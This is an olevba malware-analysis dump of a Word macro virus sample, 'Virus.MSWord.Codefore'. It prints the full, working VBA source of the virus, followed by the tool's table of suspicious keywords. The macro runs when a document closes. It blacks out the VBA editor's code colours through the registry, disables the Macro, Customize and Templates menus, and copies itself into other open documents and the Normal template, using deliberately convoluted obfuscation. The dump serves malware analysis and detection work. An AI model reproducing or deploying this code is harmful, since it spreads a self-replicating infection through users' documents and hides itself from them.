olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Codefore
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Codefore - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Module1.bas 
in file: ./Virus.MSWord.Codefore - OLE stream: 'Macros/VBA/Module1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Close()
Randomize Timer
With System.Application.System.Application.Options.Application.System
.Application.Application.System.Application.Options.Application.System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\VBA\Office", "CodeBackColors") = "1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1"
.Application.Application.System.Application.Options.Application.System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\VBA\Office", "CodeForeColors") = "1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1"
End With

With Word.Application.Options.Application.CommandBars
.Item("Tools").Controls("Macro").Enabled = (False * False * False * False * False) * 0
.Item("Tools").Controls("Customize...").Enabled = (False * False * False * False * False) * 0
.Item("Tools").Controls("Templates and Add-Ins...").Enabled = (False * False * False * False * False) * 0
.Item("Format").Controls("Style...").Enabled = (False * False * False * False * False) * 0
End With

With ThisDocument.VBProject.VBComponents((False * False * False * False * False) + 1).CodeModule.Parent.CodeModule.Parent.CodeModule
cal = .Parent.CodeModule.Parent.CodeModule.Parent.CodeModule.Parent.CodeModule.CountOfLines
ACode = .Parent.CodeModule.Parent.CodeModule.Parent.CodeModule.lines((False * False * False * False * False) + 1, cal)
End With

With Word.Application.Options.Application.Documents(Int(Rnd * Word.Application.Options.Application.Documents.Count) + (False * False * False * False * False) + 1)
With .VBProject.VBComponents((False * False * False * False * False) + 1).CodeModule.Parent.CodeModule.CodePane.CodeModule.Parent.CodeModule
cal = .Parent.CodeModule.CodePane.CodeModule.CountOfLines
.Parent.CodeModule.CodePane.CodeModule.Parent.CodeModule.CodePane.CodeModule.Parent.CodeModule.CodePane.CodeModule.Parent.CodeModule.CodePane.CodeModule.Parent.CodeModule.CodePane.CodeModule.DeleteLines (False * False * False * False * False) + 1, cal
.Parent.CodeModule.CodePane.CodeModule.Parent.CodeModule.CodePane.CodeModule.Parent.CodeModule.CodePane.CodeModule.Parent.CodeModule.CodePane.CodeModule.Parent.CodeModule.CodePane.CodeModule.InsertLines (False * False * False * False * False) + 1, ACode
End With
End With

With Word.Application.Templates.Application.ActiveDocument.Application.Options.Application.Templates.Application.Options.Application.Assistant.Application.Templates("NORMAL")
With .VBProject.VBComponents.VBE.VBProjects.VBE.VBProjects.VBE.VBProjects.Item("NORMAL").VBComponents.Item((False * False * False * False * False) + 1).CodeModule.CodePane.CodeModule.CodePane.CodeModule
cal = .CodePane.CodeModule.CodePane.CodeModule.CountOfLines
.Parent.CodeModule.CodePane.CodeModule.DeleteLines (False * False * False * False * False) + 1, cal
.Parent.CodeModule.CodePane.CodeModule.Parent.CodeModule.CodePane.CodeModule.InsertLines (False * False * False * False * False) + 1, ACode
End With
End With
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|IOC       |VBComponents.VBE    |Executable file name                         |
|IOC       |VBProjects.VBE      |Executable file name                         |
+----------+--------------------+---------------------------------------------+

